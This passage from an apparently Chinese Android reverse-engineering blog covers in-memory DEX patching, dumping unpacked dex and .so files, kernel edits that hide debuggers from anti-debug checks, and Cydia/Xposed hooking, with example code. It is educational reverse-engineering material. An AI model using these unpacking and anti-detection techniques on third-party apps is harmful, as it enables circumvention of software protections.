\"com/assassinq/editdexfile/MainActivity\";static JNINativeMethod gMethods[] = &#123; &#123;\"changeMethod\", \"(Ljava/lang/reflect/Method;)V\", (void *) changeMethod&#125;,&#125;;JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) &#123; JNIEnv *env = NULL; if (vm-&gt;GetEnv((void **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123; LOGE(\"This jni version is not supported\"); return -1; &#125; if (registerNativeMethods(env, gClassName, gMethods, sizeof(gMethods) / sizeof(gMethods[0])) == JNI_FALSE) &#123; LOGE(\"Unable to register native methods\"); return -1; &#125; LOGE(\"Methods loaded successfully\"); return JNI_VERSION_1_6;&#125; 运行程序并点击触发事件，查看日志发现修改生效： 1202-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 102-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 2 IDA 中动态修改 Ctrl+s 打开 map 数据 查找内存加载的额 classes.dex 的位置 直接计算偏移，修改相应的位置 内存修改的另一种方法修改方法定位：dexClassDef 遍历以获取 MethodId，对比 MethodName 与 proto 以获取目标 Method，然后对相应的 DexCode 进行修改。由于 Dex 加载到内存中是只有只读权限，故需要先修改内存页的权限才能正常地修改 DexCode 数据。 遍历 Map： 12345678910111213141516171819202122232425void *get_module_base(pid_t pid, const char *module_name) &#123; FILE *fp; long addr = 0; char *pch; char filename[32]; char line[1024]; if (pid &lt; 0) &#123; snprintf(filename, sizeof(filename), \"/proc/self/maps\"); &#125; else &#123; snprintf(filename, sizeof(filename), \"/proc/%d/maps\", pid); &#125; fp = fopen(filename, \"r\"); if (fp != NULL) &#123; while (fgets(line, sizeof(line), fp)) &#123; LOGD(\"%s\", line); if (strstr(line, module_name)) &#123; pch = strtok(line, \"-\"); addr = strtoul(pch, NULL, 16); break; &#125; &#125; fclose(fp); &#125; return (void *) addr;&#125; 重置 Map 属性： 12345678#include &lt;asm-generic/mman-common.h&gt;#include &lt;sys/mman.h&gt;#include &lt;limits.h&gt;if (mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) &#123; *(u4 *)(pCode-&gt;insns) = 0x000f2012; mprotect(PAGE_START((int)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);&#125; Example接下来编写 changeMethod2 函数，利用 dalvik 中的一些函数来逐步定位到指定函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152void changeMethod2(JNIEnv *env, jobject obj) &#123; u1 *pDex = (u1 *) get_module_base(-1, \"/data/dalvik-cache/data@app@com.assassinq.editdexfile\"); if (pDex != NULL) &#123; LOGD(\"Get Module\"); pDex += sizeof(DexOptHeader); DexFile *pDexFile = dexFileParse(pDex, sizeof(DexHeader), kDexParseContinueOnError); if (pDexFile == NULL) &#123; LOGE(\"Unable to parse DexFile\"); return; &#125; const DexClassDef *pClassDef; for (int i = 0; i &lt; pDexFile-&gt;pHeader-&gt;classDefsSize; ++i) &#123; const DexClassDef *pDef = dexGetClassDef(pDexFile, i); if (!strcmp(dexStringByTypeIdx(pDexFile, pDef-&gt;classIdx), \"Lcom/assassinq/editdexfile/MainActivity;\")) &#123; pClassDef = pDef; break; &#125; &#125; if (pClassDef != NULL) &#123; LOGD(\"Class Found\"); const u1 *pData = dexGetClassData(pDexFile, pClassDef); if (pData) &#123; DexClassData *pClassData = dexReadAndVerifyClassData(&amp;pData, NULL); for (int i = 0; i &lt; pClassData-&gt;header.virtualMethodsSize; ++i) &#123; DexMethod *pMethod = &amp;pClassData-&gt;virtualMethods[i]; const DexMethodId *pMethodId = dexGetMethodId(pDexFile, pMethod-&gt;methodIdx); if (!strcmp(dexStringById(pDexFile, pMethodId-&gt;nameIdx), \"ret1\")) &#123; const DexCode *pCode = dexGetCode(pDexFile, pMethod); LOGD(\"Method found and try to patch\"); if (mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE) == 0) &#123; *(u4 *) (pCode-&gt;insns) = 0x000F2012; mprotect((void *) PAGE_START((int) (pCode-&gt;insns)), PAGE_SIZE, PROT_READ); &#125; &#125; &#125; free(pClassData); &#125; &#125; dexFileFree(pDexFile); &#125;&#125;static JNINativeMethod gMethods[] = &#123; ... &#123;\"changeMethod2\", \"()V\", (void *) changeMethod2&#125;,&#125;;... 在 app 下的 build.gradle 中修改以强制转换指针： 123456789101112android &#123; ... defaultConfig &#123; ... externalNativeBuild &#123; cmake &#123; cppFlags &quot;-fpermissive&quot; &#125; &#125; &#125; ...&#125; TODO: DVM 脱壳目前存在对 apk 中的 classes.dex 进行加密的技术，称为加壳。通过对 dex 文件的加壳，可以达到减少体积，隐藏真实代码的效果。Android 的壳与 PE 文件一样，在程序运行时，先到达壳的入口点，运行解壳代码，然后再到达程序入口点并运行代码。如果要脱壳，就需要在程序解码完毕并到达程序真实入口点中间某个位置，把原始的 dex 代码给 dump 下来，还原到 apk 文件中。 查壳壳入口： 1&lt;application android:name=\"com.ali.mobisecenhance.SubApplication\" /&gt; 程序入口： 1&lt;activity android:name=\"com.ali.encryption.MainActivity\" /&gt; assets 分析assets 中一般存储着加密过的 dex，以及解密用的 so 等信息，因此先分析 assets 可以有效获取程序解壳思路。 ProxyApplication 分析壳代码分析壳代码中 Java 层转 Native 层： 12protected native void attachBaseContext(Context arg1) &#123;&#125; // 还原代码public native void onCreate() &#123;&#125; // 执行原始代码 so 文件分析带压缩的，一般用 libz 中的 uncompress 函数进行解码，可以用该函数进行快速定位。 IDA 中 dump 数据在 Native 层中解密 dex 数据并还原后，替换为原始 Application。IDC Dump 脚本： 12345678910static main(void) &#123; auto fp, begin, end, len, b; fp = fopen(\"dump.data\", \"wb\"); begin = 0x544D2008; // 解密后数据在内存中的位置 len = 0x019CF4; // 文件大小 end = begin + len; for (b = begin; b &lt; end; b++) &#123; fputc(Byte(b), fp); &#125;&#125; Dex 加载流程vm-&gt;native-&gt;dalvik_systm_DexFile-&gt;openDexFile，读取内存中的 Dex 文件数据，并加载 Dalvik_dalvik_system_DexFile_openDexFile_bytearray。 1234// 转换存储的dex格式为可执行的dex格式dvmRawDexFileOpenArray(pBytes, length, &amp;pRawDexFile);// 添加到gDvm中addToDexFileTable(pDexOrJar); 壳实现加载流程： 内存中解密 dex 函数 将 dex 存储结构转换为可执行结构 添加到 gDvm 中（有些壳是自己实现了这个功能，有些是调用了系统的函数） 抹去 dex 存储结构中的有效数据 内存 dex 定位gDvm.userDexFiles 是存放 dex cookie（dexOfJar 结构）的地方，因此可以通过遍历该数据结构来获得每个 dex 文件的起始地址。 Dex 重构：通过分析内存中的 dex 存储结构，完成对整个 dex 文件的 dump。 Dex 转 Odex：优化 vm\\analysis\\Optimize.cpp-&gt;dvmOptimizeClass Dex 校验：vm\\analysis\\DexVerify.cpp-&gt;dvmVerifyClass 取消非必要优化与校验：\\system\\build.prop =&gt; Dalvik.vm.dexopt-flag=v=n,o=n ELF 文件简介（ARM 架构下的 ELF）文件结构ELF 在加载前和加载后的文件格式是完全不同的，给加密提供了方便。 链接执行时，Section Header 中的表将会被映射到 Program Header 中，里面的 ELF Header、Program Header 和 Section header 非常重要，Linker 会根据这三个头信息进行 so 文件加载。 PS：如何从内存中 dump 下 so 文件？开启 IDA 动态调试，在 Module 窗口中找到对应的 so 文件，根据 so 文件的起始地址和文件大小，使用 IDC 脚本 dump 下来。 ELF Header存储 so 文件最为基本的信息，如 so 运行的 CPU 平台、Program Header 数量、Section Header 数量等，重要性等同于 Dex Header。 123456789101112131415161718192021$ readelf -h libxtian.soELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2's complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: DYN (Shared object file) Machine: ARM Version: 0x1 Entry point address: 0x0 Start of program headers: 52 (bytes into file) Start of section headers: 117240 (bytes into file) Flags: 0x5000200, Version5 EABI, soft-float ABI Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 8 Size of section headers: 40 (bytes) Number of section headers: 25 Section header string table index: 24 Section Header存储 so 的链接用信息，主要是用于给外部程序详细地提供本 so 的信息，比如第几行对应哪个函数、什么名字、对应着源码的什么位置等等。IDA 就是通过读取该头信息进行 so 分析的。 12345678910111213141516171819202122232425262728293031323334$ readelf -S libxtian.soThere are 25 section headers, starting at offset 0x1c9f8:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .note.gnu.build-i NOTE 00000134 000134 000024 00 A 0 0 4 [ 2] .dynsym DYNSYM 00000158 000158 000570 10 A 3 1 4 [ 3] .dynstr STRTAB 000006c8 0006c8 00034e 00 A 0 0 1 [ 4] .hash HASH 00000a18 000a18 000270 04 A 2 0 4 [ 5] .gnu.version VERSYM 00000c88 000c88 0000ae 02 A 2 0 2 [ 6] .gnu.version_d VERDEF 00000d38 000d38 00001c 00 A 3 1 4 [ 7] .gnu.version_r VERNEED 00000d54 000d54 000020 00 A 3 1 4 [ 8] .rel.dyn REL 00000d74 000d74 0050f8 08 A 2 0 4 [ 9] .rel.plt REL 00005e6c 005e6c 0000a0 08 AI 2 10 4 [10] .plt PROGBITS 00005f0c 005f0c 000104 00 AX 0 0 4 [11] .text PROGBITS 00006010 006010 013684 00 AX 0 0 4 [12] .ARM.extab PROGBITS 00019694 019694 0001a4 00 A 0 0 4 [13] .ARM.exidx ARM_EXIDX 00019838 019838 000250 08 AL 11 0 4 [14] .rodata PROGBITS 00019a90 019a90 0002d0 00 A 0 0 16 [15] .fini_array FINI_ARRAY 0001ad64 019d64 000008 00 WA 0 0 4 [16] .init_array INIT_ARRAY 0001ad6c 019d6c 000004 00 WA 0 0 1 [17] .dynamic DYNAMIC 0001ad70 019d70 000120 08 WA 3 0 4 [18] .got PROGBITS 0001ae90 019e90 000170 00 WA 0 0 4 [19] .data PROGBITS 0001b000 01a000 002870 00 WA 0 0 16 [20] .bss NOBITS 0001d870 01c870 0001d8 00 WA 0 0 4 [21] .comment PROGBITS 00000000 01c870 00003d 01 MS 0 0 1 [22] .note.gnu.gold-ve NOTE 00000000 01c8b0 00001c 00 0 0 4 [23] .ARM.attributes ARM_ATTRIBUTES 00000000 01c8cc 000036 00 0 0 1 [24] .shstrtab STRTAB 00000000 01c902 0000f6 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) Program Header存储 so 文件运行时需要的信息。该信息会直接被 Linker 所使用，运用于 so 加载。因此这个 Header 的数据是肯定可信的 123456789101112131415161718192021222324252627$ readelf -l libxtian.soElf file type is DYN (Shared object file)Entry point 0x0There are 8 program headers, starting at offset 52Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00100 0x00100 R 0x4 LOAD 0x000000 0x00000000 0x00000000 0x19d60 0x19d60 R E 0x1000 LOAD 0x019d64 0x0001ad64 0x0001ad64 0x02b0c 0x02ce4 RW 0x1000 DYNAMIC 0x019d70 0x0001ad70 0x0001ad70 0x00120 0x00120 RW 0x4 NOTE 0x000134 0x00000134 0x00000134 0x00024 0x00024 R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0 EXIDX 0x019838 0x00019838 0x00019838 0x00250 0x00250 R 0x4 GNU_RELRO 0x019d64 0x0001ad64 0x0001ad64 0x0029c 0x0029c RW 0x4 Section to Segment mapping: Segment Sections... 00 01 .note.gnu.build-id .dynsym .dynstr .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.extab .ARM.exidx .rodata 02 .fini_array .init_array .dynamic .got .data .bss 03 .dynamic 04 .note.gnu.build-id 05 06 .ARM.exidx 07 .fini_array .init_array .dynamic .got 加载 so 的流程Android 上的 ELF 文件是通过 Linker（位于 Bionic/Linker）加载到内存中并进行执行的。所以通过研究 Linker 可以清楚地知道 Android 系统到底使用了到了 so 的哪些数据。Linker 启动时会先对自身的函数表数据等进行重定位，然后再对其他 so 文件进行定位。 Linkere 加载中只会用到 Program Header（甚至直接删除 Section Header 也是可以的）。Program Header 解析： 12345link.cpp -&gt; soinfo *do_dlopen(const char *name, int flags) // so加载find_library(name);si-&gt;CallConstructors();CallFunction(\"DT_INIT\", init_func); // so脱壳点CallArray(\"DT_INIT_ARRAY\", init_array, init_array_count, false); // dex脱壳点 加载 so 的时候，有两种加载方式，一个是直接 load，还有一个是 loadLibrary。无论是哪种方式，都会先获取 ClassLoader，然后再调用相应的方法。当传进来的 loader 不为空，则会调用 findLibrary 方法，然后执行 doLoad 方法，如果 loader 为空，则会执行另一个流程，但是后面也会执行 doLoad 方法。 ELF 文件变形与保护（阻碍分析） Section 段处理：鉴于 Section Header 没有被 Linker 用于加载，所以可以对 Section 段写入无用数据，可以阻碍静态分析软件的分析。 Program 段处理：Program 段中可以对 DYNAMIC 区段进行混淆，添加重复的数据以及无效的数据。 so 文件加壳修复12345678Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align EXIDX 0x02867c 0x0002867c 0x0002867c 0x00568 0x00568 R 0x4 LOAD 0x000000 0x00000000 0x00000000 0x13294 0x13294 R E 0x8000 LOAD 0x018c10 0x00030c10 0x00030c10 0x0052c 0x01548 RW 0x8000 DYNAMIC 0x018c74 0x00030c74 0x00030c74 0x00108 0x00108 RW 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x4 GNU_RELRO 0x018c10 0x00030c10 0x00030c10 0x003f0 0x003f0 R 0x1 加过壳的标志：FileSiz!=MemSiz，明显存在加载后在内存进行解码的可能。函数地址也在文件之外。 修复：dump 内存，数据对齐重定位。 Android 源码定制添加反反调试基址反调试一般会检测 proc 下是否有 status/stat 文件。首先修改 kernel 源码中的 fs/proc/base.c。修改 proc_pid_wchan 函数的返回值： 12345678910111213141516171819static int proc_pid_wchan(struct task_struct *task, char *buffer)&#123; unsigned long wchan; char symname[KSYM_NAME_LEN]; wchan = get_wchan(task); if (lookup_symbol_name(wchan, symname) &lt; 0) if (!ptrace_may_access(task, PTRACE_MODE_READ)) return 0; else return sprintf(buffer, \"%lu\", wchan); else &#123; if (strstr(symname, \"trace\")) &#123; // 检测进程中是否有trace这个字符串 return sprintf(buffer, \"%s\", \"sys_epoll_wait\"); // sys_epoll_wait用来获取文件状态已经就绪的事件 &#125; return sprintf(buffer, \"%s\", symname); &#125;&#125; 然后是 fs/proc/array.c 文件，分别修改 tast_state 函数和 task_state_array 变量： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static inline void task_state(struct seq_file *m, struct pid_namespace *ns, struct pid *pid, struct task_struct *p)&#123; struct group_info *group_info; int g; struct fdtable *fdt = NULL; const struct cred *cred; pid_t ppid, tpid; rcu_read_lock(); ppid = pid_alive(p) ? task_tgid_nr_ns(rcu_dereference(p-&gt;real_parent), ns) : 0; tpid = 0; if (pid_alive(p)) &#123; struct task_struct *tracer = ptrace_parent(p); if (tracer) tpid = task_pid_nr_ns(tracer, ns); &#125; cred = get_task_cred(p); seq_printf(m, \"State:\\t%s\\n\" \"Tgid:\\t%d\\n\" \"Pid:\\t%d\\n\" \"PPid:\\t%d\\n\" \"TracerPid:\\t%d\\n\" \"Uid:\\t%d\\t%d\\t%d\\t%d\\n\" \"Gid:\\t%d\\t%d\\t%d\\t%d\\n\", get_task_state(p), task_tgid_nr_ns(p, ns), pid_nr_ns(pid, ns), ppid, 0, // 把tpid修改为0 cred-&gt;uid, cred-&gt;euid, cred-&gt;suid, cred-&gt;fsuid, cred-&gt;gid, cred-&gt;egid, cred-&gt;sgid, cred-&gt;fsgid); task_lock(p); if (p-&gt;files) fdt = files_fdtable(p-&gt;files); seq_printf(m, \"FDSize:\\t%d\\n\" \"Groups:\\t\", fdt ? fdt-&gt;max_fds : 0); rcu_read_unlock(); group_info = cred-&gt;group_info; task_unlock(p); for (g = 0; g &lt; min(group_info-&gt;ngroups, NGROUPS_SMALL); g++) seq_printf(m, \"%d \", GROUP_AT(group_info, g)); put_cred(cred); seq_putc(m, '\\n');&#125;static const char * const task_state_array[] = &#123; \"R (running)\", /* 0 */ \"S (sleeping)\", /* 1 */ \"D (disk sleep)\", /* 2 */ \"S (sleeping)\", // \"T (stopped)\", /* 4 */ \"S (sleeping)\", // \"t (tracing stop)\", /* 8 */ \"Z (zombie)\", /* 16 */ \"X (dead)\", /* 32 */ \"x (dead)\", /* 64 */ \"K (wakekill)\", /* 128 */ \"W (waking)\", /* 256 */&#125;; 然后可以根据这篇文章把 boot.img 重新打包并刷入手机。 Refereenceshttps://www.bilibili.com/video/av45424886https://www.jianshu.com/p/f7f0a712ddfehttps://source.android.com/devices/tech/dalvik/dex-format.htmlhttps://www.jianshu.com/p/f7f0a712ddfehttp://gnaixx.cc/2016/11/26/20161126dex-file/https://www.cnblogs.com/stars-one/p/8890162.htmlhttp://shxi.me/posts/7b82cd68.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"Android逆向入门（三）","slug":"Android逆向入门（三）","date":"2020-02-12T06:06:59.000Z","updated":"2020-02-19T09:06:39.439Z","comments":true,"path":"2020/02/12/Android逆向入门（三）/","link":"","permalink":"blog.b3ale.cn/2020/02/12/Android逆向入门（三）/","excerpt":"记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。","text":"记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。 JEB 插件扩展插件帮助文件1$JEB/doc/apidoc 插件编写语言：Java/Python 123456789import jeb.api.IScript;public class decJebString implemants IScript &#123; private JebInstance jeb = null; @Override public void run(JebInstance jebInstance) &#123; jeb = jebInstance; jeb.print(\"Hello World!!!\"); &#125;&#125; 强制反编译结果，相当于 Ctrl+F5： 12345678910111213141516171819202122232425262728import jeb.api.IScript;public class decJebString implemants IScript &#123; private static String targetSignature = \"Lcom/pnfsoftware/jebglobal/decStr;-&gt;decodeString([BII)Ljava/lang/String;\"; private JebInstance jeb = null; @Override public void run(JebInstance jebInstance) &#123; jeb = jebInstance; Dex dex = jeb.getDex(); List&lt;String&gt; classSignatures = dex.getClassSignatures(true); int methodCount = dex.getMethodCount(); String methodSig; for(int i = 0; i &lt; methodCount; i++) &#123; DexMethod dexMethod = dex.getMethod(i); int idx = dexMethod.getIndex(); methodSig = dexMethod.getSignature(true); if(methodSig.equals(targetSignature)) &#123; List&lt;Integer&gt; methodReferences = dex.getMethodReferences(idx); // 获取交叉引用 for(Integer refIdx : methodReferences) &#123; DexMethod refDexMethod = dex.getMethod(refIdx); jeb.decompileMethod(refDexMethod.getSignature(true)); ... &#125; &#125; &#125; ... &#125; ...&#125; Android 快速定位关键代码 字符串、特征字 关键 API 监控 Hook 解密函数 Monitor 插 Log 信息 invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V 动态调试 快速 Hook 代码对函数进行挂钩，可以影响整个函数的执行。挂钩后，注入的代码可以接管整个函数，修改函数的参数，返回值，甚至整个函数的行为等。 Cydia Substrate只要知道类名就可以 Hook，而且属于系统全局属性，软件基本上不能检测到。 Hook Java 新建空项目 导入 lib 文件 substrate-api.jar 修改 AndroidManifest.xml 文件 编写入口类 安装激活插件，重启后可以看到插件效果 Example修改 AndroidManifest.xml 文件： 123456789&lt;manifest&gt; &lt;application&gt; ... &lt;meta-data android:name=\"com.saurik.substrate.main\" android:value=\"com.assassinq.cydiajavahook.CydiaMain\"/&gt; ... &lt;/application&gt; &lt;uses-permission android:name=\"cydia.permission.SUBSTRATE\"/&gt; &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\"&gt;&lt;/uses-permission&gt;&lt;/manifest&gt; 编写入口类 12345678910111213141516171819202122232425262728293031package com.assassinq.cydiajavahook;import com.saurik.substrate.MS;import java.lang.reflect.Method;public class CydiaMain &#123; static void initialize() &#123; MS.hookClassLoad(\"android.content.res.Resources\", new MS.ClassLoadHook() &#123; @Override public void classLoaded(Class&lt;?&gt; resources) &#123; Method getColor; try &#123; getColor = resources.getDeclaredMethod(\"getColor\", Integer.TYPE); &#125; catch (Exception e) &#123; getColor = null; &#125; if (getColor != null) &#123; final MS.MethodPointer old = new MS.MethodPointer(); MS.hookMethod(resources, getColor, new MS.MethodHook() &#123; @Override public Object invoked(Object res, Object... args) throws Throwable &#123; int color = (Integer) old.invoke(res, args); return color &amp; ~0xFFFFFF | 0x00AAAA; &#125; &#125;, old); &#125; &#125; &#125;); &#125;&#125; 编写完成后，将程序安装到手机上，会弹出 Substrate extentions updated： 点击进入 Cydia Substrate，点击 Restart System (Soft) 来重启系统： 重启后发现系统某些部分的颜色已经被我们 Hook 成了其他颜色： 在设置中打开更加明显： Java 反射Java 可以通过反射方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始累的定义的情况下，去修改类中相关的成员的属性、值等。 所有类都是继承自 Object 类的，所以都可以使用 Object 的方法。也可以强制转换为 Object。所有，遇到无法表示出来的对象时，直接用 Object 即可。 获取对象的类： 12Object obj = \"123\";Class clazz = obj.getClass(); 获取类中的方法（使用对应的不是以 s 为后缀的函数可以获取特定的函数或 field）： 1234Method[] mPubMethods = clazz.getMethods(); // 获取公有可直接调用的方法Method[] mDeclareMethods = clazz.getDeclareMethods(); // 获取类中声明的所有方法Field[] mPubFields = clazz.getFields(); // 获取public的fieldField[] mDeclareFields = clazz.getDeclaredFields(); // 获取声明的所有field 方法调用： 1method.invoke(obj, arg) 域操作： 12field.set(obj, \"1\");field.get(obj); 访问权限设置（域与方法都一样，控制是否可以直接访问，其实就是相当于 public 属性）： 12field.isAccessible();field.setAccessible(true); 其余的函数，可以获取函数的名称，还有其他种种信息： 123field.getName();field.toString();Class.forName(\"android.view.Menu\"); // 寻找类，必须是一个classloader下的才能使用 XposedXposed 是在程序启动的时候同时加载的，因此他的 Hook 是区分进程的。对于程序的类和参数可以通过名字来进行 Hook。Xposed 的 Hook 分为函数执行前和执行后两个位置，可以分别进行参数修改和结果修改。如果不想进行调用的话，可以在执行前使用 setResult(NULL) 函数。比起 Cydia 使用范围更加广泛，各种插件都是基于 Xposed 的，并且是开源的。 新建基础项目 导入 lib 文件 XposedBridgeApi-54.jar（compileOnly 模式，也就是不参与编译到最终文件中） 修改 AndroidManifest.xml 文件 入口类编写 设置启动入口：在 assets 文件夹中，新建 xposed_init 文件，写入入口类的信息 com.assassinq.xposedjavahook.XposedMain 安装激活插件，重启后可以看到插件效果 修改 app 下的 build.gradle 文件，将对应 lib/XposedBridgeApi-54.jar 的操作 implementation 修改成 compileOnly： 12345...dependencies &#123; ... compileOnly files('lib/XposedBridgeApi-54.jar')&#125; Hook Java修改 AndroidManifest.xml 文件： 123456789&lt;manifest&gt; &lt;application&gt; ... &lt;meta-data android:name=\"xposedmodule\" android:value=\"true\"/&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"Hook getColor\"/&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"54\"/&gt; &lt;/application&gt; &lt;uses-permission android:name=\"android.permission.READ_PHONE_STATE\"&gt;&lt;/uses-permission&gt;&lt;/manifest&gt; 入口类编写，新建一个类文件： 12345678910111213141516171819202122232425262728public class XposedMain implements IXposedHookLoadPackage &#123; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) throws Throwable &#123;// if (param.packageName.equals(\"apk\")) &#123; try &#123; findAndHookMethod(\"android.content.res.Resources\", param.classLoader, \"getColor\", int.class, new myGetColor());// waitForDebugger(); &#125; catch (Exception e) &#123; XposedBridge.log(e); &#125;// &#125; &#125;&#125;class myGetColor extends XC_MethodHook &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; Log.d(\"DEBUG\", \"Before Method Hook\"); &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; Log.d(\"DEBUG\", \"After Method Hook\"); int res = (int) param.getResult();s res = res &amp; ~0xFFFFFF | 0x00AAAA; param.setResult(res); &#125;&#125; 同样，编写完成后会弹出一个 Xposed module is not activated： 点击后勾选我们编写的模块，并在 Framework 界面点击 Soft Reboot 以激活插件： 重启后系统部分颜色同样被改变，但效果没有 Cydia 的好： classLoader与 Java 上的类似，就是一个类装载器。与 Java 不同的是，classLoader 所加载的就是 dex 文件本身。所以通过程序的 classLoader，可以取得程序的 dex 中所定义的所有类及其成员函数。同理，如果一个程序有多个 dex，那么会对应着多个 classLoader，特别是使用动态加载的 dex，则需要传递想要的 classLoader 才可以进行数据获取。 Android 源码浅析EnvironmentUbuntu 14.04 编译首先搭建好 JDK 6 的环境： 1234567891011cd &amp;&amp; wget https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64.binchmod +x jdk-6u45-linux-x64.bin &amp;&amp; ./jdk-6u45-linux-x64.bincd /usr &amp;&amp; sudo mkdir javacd java &amp;&amp; sudo mv ~/jdk1.6.0_45 .vim ~/.bashrc# export JAVA_HOME=\"/usr/java/jdk1.6.0_45\"# export JRE_HOME=\"$JAVA_HOME/jre\"# export CLASSPATH=\"$CLASSPATH:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\"# export PATH=\"$PATH:$JAVA_HOME/bin\"source ~/.bashrcjava -version 然后安装一些编译时需要用到的依赖文件： 12sudo apt-get updatesudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip 添加 51-android.rules，使得手机 USB 连接到 Ubuntu 能够被识别： 123cd &amp;&amp; wget https://raw.githubusercontent.com/M0Rf30/android-udev-rules/master/51-android.rulessudo mv 51-android.rules /etc/udev/rules.d/sudo udevadm control --reload-rules 接下来使用 repo 工具同步下载 Android 源码： 1234567891011121314cd &amp;&amp; mkdir bin # export PATH=\"$HOME/bin:$PATH\"curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo# curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repoexport WORKING_DIRECTORY=\"android-4.4.3_r1\"mkdir $WORKING_DIRECTORY &amp;&amp; cd $WORKING_DIRECTORYgit config --global user.name \"Your Name\"git config --global user.email \"your@example.com\"# export REPO_URL=\"https://aosp.tuna.tsinghua.edu.cn/android/git-repo\"# vim ~/bin/repo # REPO_URL = 'https://aosp.tuna.tsinghua.edu.cn/android/git-repo'repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.4.3_r1# repo init -u https://android.googlesource.com/platform/manifest -b android-4.4.3_r1repo sync # Takes a very long time# repo sync -c --no-clone-bundle --no-tags --prune -j4 同步完成后进行编译： 123456source build/envsetup.sh # Setup environmentlunch aosp_arm-eng # Setup choicesexport USE_CCACHE=1 # Enable ccacheprebuilts/misc/linux-x86/ccache/ccache -M 100G # Set ccache memory = 100G# export CCACHE_DIR=$YOUR_PATH/.ccache # Set ccache dir # Default in $HOME/.ccachemake -j4 目录结构安装一下 Android Studio，用来作为查看源码的编辑器： 1234567sudo apt-get updatesudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386wget https://dl.google.com/dl/android/studio/ide-zips/3.5.3.0/android-studio-ide-191.6010548-linux.tar.gztar zxvf android-studio-ide-191.6010548-linux.tar.gzsudo mv android-studio /usr/localcd /usr/local/android-studio/bin./studio.sh PS：谷歌在国内有服务器，用 ping.chinaz.com 解析出 dl.google.com 最快的 ip，在 hosts 里写死就行了，直接满速下载。 生成 Android Studio 文件： 1234cd $HOME/$WORKING_DIRECTORY &amp;&amp; source build/envsetup.shlunch aosp_arm-engcd development/tools/idegen &amp;&amp; mmcd $HOME/$WORKING_DIRECTORY &amp;&amp; ./development/tools/idegen/idegen.sh 运行完后，将根目录下的 android.ipr 导入 Android Studio 即可。目录结构： 文件夹/文件 包含内容 abi art art 模式相关的代码 bionic 各种 so 库的源代码 bootable recovery、bootloader、diskinstaller build 源码编译生成的规则代码 cts Android 兼容性测试套件标准 dalvik Dalvik 模式相关的代码 developers 一些开发上用来参考的资料 development Android 开发相关的代码，makekey 等 device 手机驱动的源码 docs doc 文档 external Android 使用的一些开源的模块 frameworks 框架 hardware 部分开源的 HAL 代码 libcore 一些核心的 lib 文件库 libnativehelper jni 相关的代码，包括如何通过 jni 来获取 Dalvik 中的某些函数 Makefile ndk ndk 代码 out packages 应用程序源码 pdk prebuilts 镜像生成依赖的一些文件，如 gcc、kernel 等 sdk sdk 源码，模拟器源码 system 底层文件系统库、应用及组件（C 语言） tools 内核代码编译内核代码 123456789101112git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm# git clone https://android.googlesource.com/kernel/msmcd msmgit branch -agit checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1sudo -i # 在root下进行编译export PATH=\"$PATH:$WORKING_DIRECTORY/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin\"export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead_defconfigmake -j4 完成后将输出的 zImage-dtb 文件覆盖到之前的安卓源码中。重新编译手机镜像： 123source build/envsetup.shlunch aosp_hammerhead-userdebugmake -j4 刷机： 12adb reboot bootloaderfastboot -w flashall 编译命令 作用 m 编译所有的模块 mm 